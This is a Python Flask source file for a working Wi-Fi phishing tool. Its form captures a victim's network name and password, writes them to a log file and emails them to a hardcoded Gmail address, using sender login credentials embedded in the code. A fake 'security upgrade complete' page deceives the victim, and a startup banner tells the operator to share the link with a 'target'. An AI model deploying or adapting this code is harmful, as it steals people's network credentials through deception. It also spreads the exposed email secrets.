from flask import Flask, render_template, request, redirect, url_for
import smtplib
from email.mime.text import MIMEText
import ssl
import os
import socket
from datetime import datetime

app = Flask(__name__)

# Email configuration - REPLACE WITH YOUR VALUES
EMAIL_SENDER = 'yooptxx@gmail.com'  # Your Gmail address
EMAIL_PASSWORD = 'pixkdauqdmohgyid'   # Use an App Password (not your Gmail password)
EMAIL_RECEIVER = 'methullakvindu5@gmail.com'  # Where to send the data

# Function to get all IP addresses of the server
def get_ip_addresses():
    ip_addresses = []
    try:
        # Get hostname
        hostname = socket.gethostname()
        # Get local IP by hostname
        local_ip = socket.gethostbyname(hostname)
        ip_addresses.append(local_ip)
        
        # Try to get all network interfaces
        try:
            # For more accurate network interfaces scanning
            import netifaces
            for interface in netifaces.interfaces():
                addresses = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addresses:
                    for link in addresses[netifaces.AF_INET]:
                        ip = link['addr']
                        # Skip localhost
                        if ip != '127.0.0.1':
                            if ip not in ip_addresses:
                                ip_addresses.append(ip)
        except ImportError:
            # Fallback method if netifaces is not available
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                # Doesn't need to be reachable
                s.connect(('10.255.255.255', 1))
                ip = s.getsockname()[0]
                if ip not in ip_addresses:
                    ip_addresses.append(ip)
            except:
                pass
            finally:
                s.close()
    except:
        pass
    
    return ip_addresses

# Route to display the form
@app.route('/')
def home():
    return render_template('index.html')

# Route to handle form submission
@app.route('/secure', methods=['POST'])
def secure():
    try:
        # Get form data
        ssid = request.form.get('ssid', '').strip()
        password = request.form.get('password', '').strip()
        
        # Get additional information
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Validate inputs
        if not ssid or not password:
            return "Both Network Name and password are required!", 400

        # Create email message with more detailed information
        subject = "Wi-Fi Security Credentials Captured"
        body = f"""
Wi-Fi Credentials:
-----------------
SSID: {ssid}
Password: {password}

Additional Information:
---------------------
IP Address: {ip_address}
User Agent: {user_agent}
Timestamp: {timestamp}
        """
        
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = EMAIL_SENDER
        msg['To'] = EMAIL_RECEIVER

        # Log the capture to a file as backup
        try:
            log_dir = "logs"
            if not os.path.exists(log_dir):
                os.makedirs(log_dir)
                
            with open(f"{log_dir}/captured_credentials.log", "a") as log_file:
                log_file.write(f"\n\n--- NEW CAPTURE: {timestamp} ---\n")
                log_file.write(body)
        except Exception as e:
            print(f"Error writing to log file: {str(e)}")

        # Try sending with SSL first, fallback to STARTTLS
        try:
            # Method 1: SSL on port 465
            context = ssl.create_default_context()
            with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as server:
                server.login(EMAIL_SENDER, EMAIL_PASSWORD)
                server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
        except Exception as e:
            print(f"SSL email error: {str(e)}")
            # Method 2: STARTTLS on port 587
            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()
                server.login(EMAIL_SENDER, EMAIL_PASSWORD)
                server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())

        return redirect(url_for('success'))

    except smtplib.SMTPAuthenticationError:
        print("SMTP Authentication Error")
        return "Connection error. Please try again later.", 500
    except Exception as e:
        print(f"General error: {str(e)}")
        return "An error occurred. Please try again later.", 500

# Success page - show a more convincing "security upgrade" message
@app.route('/success')
def success():
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Security Upgrade Complete</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #004e92 0%, #000428 100%);
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: white;
                text-align: center;
            }
            
            .container {
                max-width: 600px;
                padding: 40px;
            }
            
            .success-icon {
                font-size: 5rem;
                color: #4CAF50;
                margin-bottom: 20px;
                animation: pulse 2s infinite;
            }
            
            @keyframes pulse {
                0% { transform: scale(1); }
                50% { transform: scale(1.1); }
                100% { transform: scale(1); }
            }
            
            h1 {
                font-size: 2.5rem;
                margin-bottom: 20px;
            }
            
            p {
                font-size: 1.2rem;
                line-height: 1.6;
                margin-bottom: 20px;
                opacity: 0.9;
            }
            
            .progress-container {
                margin: 30px 0;
            }
            
            .progress-bar {
                height: 10px;
                background-color: rgba(255, 255, 255, 0.2);
                border-radius: 5px;
                overflow: hidden;
                position: relative;
            }
            
            .progress-fill {
                position: absolute;
                height: 100%;
                width: 100%;
                background: linear-gradient(90deg, #4CAF50, #8BC34A);
                border-radius: 5px;
                animation: fill 3s forwards;
            }
            
            @keyframes fill {
                0% { width: 0; }
                100% { width: 100%; }
            }
            
            .status-text {
                margin-top: 10px;
                font-weight: bold;
            }
            
            .benefits {
                display: flex;
                flex-direction: column;
                align-items: flex-start;
                text-align: left;
                margin: 30px 0;
                background-color: rgba(255, 255, 255, 0.1);
                padding: 20px;
                border-radius: 10px;
            }
            
            .benefit-item {
                display: flex;
                align-items: center;
                margin-bottom: 15px;
                animation: fadeIn 0.6s forwards;
                opacity: 0;
            }
            
            @keyframes fadeIn {
                0% { opacity: 0; transform: translateY(10px); }
                100% { opacity: 1; transform: translateY(0); }
            }
            
            .benefit-item:nth-child(1) { animation-delay: 0.5s; }
            .benefit-item:nth-child(2) { animation-delay: 1s; }
            .benefit-item:nth-child(3) { animation-delay: 1.5s; }
            .benefit-item:nth-child(4) { animation-delay: 2s; }
            
            .benefit-icon {
                color: #4CAF50;
                margin-right: 15px;
                font-size: 1.5rem;
            }
            
            .footer {
                margin-top: 40px;
                font-size: 0.9rem;
                opacity: 0.7;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="success-icon">
                <i class="fas fa-shield-alt"></i>
            </div>
            
            <h1>Wi-Fi Security Upgrade Complete!</h1>
            <p>Your network has been successfully secured with advanced 1.1.1.1 protection.</p>
            
            <div class="progress-container">
                <div class="progress-bar">
                    <div class="progress-fill"></div>
                </div>
                <div class="status-text">Security protocols activated • 100% Complete</div>
            </div>
            
            <p>Your network is now protected against common cyber threats. All your connected devices are now secured with enhanced encryption.</p>
            
            <div class="benefits">
                <div class="benefit-item">
                    <div class="benefit-icon"><i class="fas fa-lock"></i></div>
                    <div>Enhanced encryption protocols activated</div>
                </div>
                <div class="benefit-item">
                    <div class="benefit-icon"><i class="fas fa-tachometer-alt"></i></div>
                    <div>Network speed optimized to 300Mbps+</div>
                </div>
                <div class="benefit-item">
                    <div class="benefit-icon"><i class="fas fa-shield-alt"></i></div>
                    <div>Intrusion prevention system enabled</div>
                </div>
                <div class="benefit-item">
                    <div class="benefit-icon"><i class="fas fa-user-shield"></i></div>
                    <div>Personal data protection activated</div>
                </div>
            </div>
            
            <p>Your network will now automatically filter malicious traffic and protect all connected devices.</p>
            
            <div class="footer">
                Powered by 1.1.1.1 Advanced Security Protocol
            </div>
        </div>
    </body>
    </html>
    """

if __name__ == '__main__':
    # Get all IP addresses
    ip_addresses = get_ip_addresses()
    
    print("\n" + "="*80)
    print(" WIFI CREDENTIALS CAPTURE TOOL STARTED ".center(80, '='))
    print("="*80)
    
    if ip_addresses:
        print("\nThe application can be accessed through any of these URLs:")
        for ip in ip_addresses:
            print(f"http://{ip}:5000")
    else:
        print("\nCouldn't detect any network IP addresses.")
        print("The application is running at: http://127.0.0.1:5000 (localhost only)")
    
    print("\nShare any of these links with your target to capture their Wi-Fi credentials")
    print("="*80 + "\n")
    
    # Run the Flask app
    app.run(debug=True, host='0.0.0.0', port=5000)